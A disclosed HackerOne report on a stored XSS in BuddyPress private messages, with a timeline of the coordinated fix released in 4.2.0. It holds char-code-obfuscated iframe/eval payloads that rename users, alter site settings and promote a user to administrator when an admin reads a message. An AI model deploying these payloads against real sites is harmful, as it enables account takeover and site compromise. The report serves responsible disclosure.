---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/wordpress
  - vuln/xss-stored
  - vuln/xss
  - vuln/code-injection
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2019-03-08
submitted: 2019-01-28T07:45:00.790Z
bounty_usd: null
votes: 337
cve: []
program: "[[programs/wordpress|WordPress]]"
reporter: "klmunday"
source: "https://hackerone.com/reports/487081"
title: "Stored XSS in Private Message component (BuddyPress)"
---
# Stored XSS in Private Message component (BuddyPress)

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 337 | **Program:** WordPress | **Disclosed:** 2019-03-08

- Report: [https://hackerone.com/reports/487081](https://hackerone.com/reports/487081)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2019-01-28T07:45:00.790Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Description:
WordPress version: **5.0.3**
BuddyPress version: **4.1.0**

Users with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).

The code which runs can be exploited to perform any action that the "Victim" has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private information such as users emails. This includes any actions for other plugins etc.

The only prerequisites for this is that private messaging is enabled in the BuddyPress settings and that the attacker has an account (with default permissions).

## Steps To Reproduce:
Via composing a new message
1. Go to another users profile
2. Click private message
3. Type any subject
4. Type the following message  `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
5. Send the message
6. View the message (triggers the XSS)
7. Wait for the victim to read the message

Via replying to an existing thread
1. Go to your inbox
2. View any message you have received
3. Respond to the message with `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
4. View the message (triggers the XSS)
5. Wait for the victim to read the message

Payloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and eval'd:
**example:**
```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```
**would run**
```javascript
let test = 123;
alert(test);
```

Larger payloads can be used. However, due to the code needing to be in an array of char codes (if it contains spaces or quotations) I have written a small python script to convert javascript code into a sendable message. It also includes some Proof of concept payloads which perform the following:
- Change the users username to `HACKED` (affects any user)
- Change the websites title and description (requires a privileged user to read the message)
- Change a users permissions to administrator (requires a privileged user to read the message)

Please see the attached zip file for the script and payloads (they have not been pre-converted)

See some example payloads below: 
(note: the spacing is to prevent the iframe element being visible in the message exert displayed in the inbox - it is not required for it to work, nor is the start of the message, only the iframe is needed).
**Change username to `HACKED`**
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;></iframe>
```

**Change site title and description:** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

**Change user permissions for the user with id `2` to administrator** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

For a more detailed write-up including images please view this [Google Doc (unlisted)](https://docs.google.com/document/d/1RgMWJlYen9iR_JTxATYR4TJWAPKRgaSKuiiqZp7x8L0/edit?usp=sharing) (if this is not allowed please let me know so that I can include them here if necessary)

## Impact

An attacker could craft a payload to perform any action which their target can perform. This is especially dangerous for administrators since if the attacker targeted them they could modify site data/content, modify accounts, read sensitive information such as users private information and more.

In my testing I was able to change profile names, change users passwords, read users email addresses, modify pages, modify the site data and modify the WordPress settings including the sites email address.

I did not find anything I could not exploit which the targeted user had permissions to do, it seems depending on the target that the attacker can achieve full access to wp-admin and any other plugins that are installed and even chain requests together within a single attack.

It would also be possible to create a worm which when read would email its content to every other user again.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2019-02-01** @klmunday: Hi John,

Thank you for the quick response, I am glad to hear that a patch is already underway
I've got some spare time this weekend so I may be able to dig a bit more into this.

Thanks again,
- **2019-02-03** @klmunday: Hello,

I have done some more digging and have discovered that this is only an issue with the Nouveau Template pack and is not present in the Legacy pack.

I found that by changing `{{{data.content}}}` to `{{data.content}}` in `common/js-templates/messages/index.php` causes the message contents to be rendered as plaintext within the messages. However, since the Editor uses html tags for its markdown (and all the messages are wrapped in <p> tags) I found this to not be a sufficient solution. 

I will let you know if I find anything else

Hope all is well,
-KLMunday
- **2019-02-07** @jjj: Hey @klmunday,

Thanks for the update. Our team ended at a similar, but slightly changed, end result.

In addition to the bracket changes in the template output, we've also removed some calls to `html_entity_decode()`, as a way to reverse the problem without breaking existing installations.

I've attached the patch, which we've tested and confirmed fixes the issue as we understand it.

If you agree this adequately addresses your findings, our goal would be to release an update to BuddyPress next week, or the early part of the week after next.

Thank you again, and talk soon
- **2019-02-08** @klmunday: Hello @jjj

Happy to say I can't find any way to break this.
I am happy with this as a solution

Thanks again
- **2019-02-08** @klmunday: I may have spoke too soon, it seems you can inject some html into the Subject now, I can seem to get <b> and <i> working fine, possibly others though

Was an easy fix though, just change all uses of `{{{data.subject}}}` to `{{data.subject}}` in `messages/index.php`
Doesn't seem to break anything - not sure if it was intended to be changed

Seems all fine with that change
- **2019-02-14** @jjj: Inviting HackerOne user foobar7, as he's reported a duplicate of this same issue.

As a general update to all participants, @boonebgorges will be taking over communication here, as he's been largely responsible for researching and patching this issue behind the scenes.

Thank you very much again for your continued patience.
-JJJ
- **External User Joined**
- **2019-02-18** @boonebgorges: Hi all -

I'm attaching an updated patch addressing the issue.

@klmunday You are correct that the previous patch allowed for some HTML to be passed into Subject lines. This was not a security vulnerability, as this markup was validated using a tag whitelist and `wp_kses`. However, it was an unintended and undesirable change in behavior. As such, the updated patch strips HTML tags altogether in the subject and excerpt contexts. In addition, there are some changes in the patch related to the way that the avatar URL is returned from the AJAX endpoints; these changes don't address any vulnerabilities that we're aware of, but they make our character handling more transparent and consistent with the other changes in the patch.

The current plan is to ship a BuddyPress security and maintenance release later this week, which will include the fix. @klmunday and @foobar7 If you'd like to be cited in the release post, please let me know what name and/or link to use. See https://buddypress.org/2018/01/buddypress-2-9-3-security-and-maintenance-release/ for a past example.
- **2019-02-18** @klmunday: Hi @boonebgorges,

Tested the patch and it works perfectly,
ah yeah I always forget about `wp_kses`

Please cite me as [Kieran Munday](www.klmunday.com)

Thanks again!
- **2019-02-19** @foobar7: Hi @boonebgorges,

you can cite me as Tim Coen (https://security-consulting.icu/). 

Thanks!
Tim
- **2019-02-20** @boonebgorges: Hi all - BuddyPress 4.2.0 has been released, and includes a fix for this issue. Thanks to both of you for coordinating with our team. https://buddypress.org/2019/02/buddypress-4-2-0-maintenance-and-security-release/
- **2019-02-27** @klmunday: Hi Boone,
That is great news!
If it is fine with both of you, when this is Resolved would it be possible to have full disclosure?

Thanks,
Kieran
- **Report Resolved**
- **2019-02-28** @foobar7: HI @klmunday ,

I'm not sure if the question was also directed at me,  but from my side you can go ahead and disclose this report.

Best,
Tim
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Bounty Awarded**
- **2019-03-25** @klmunday: Thanks for the bounty!
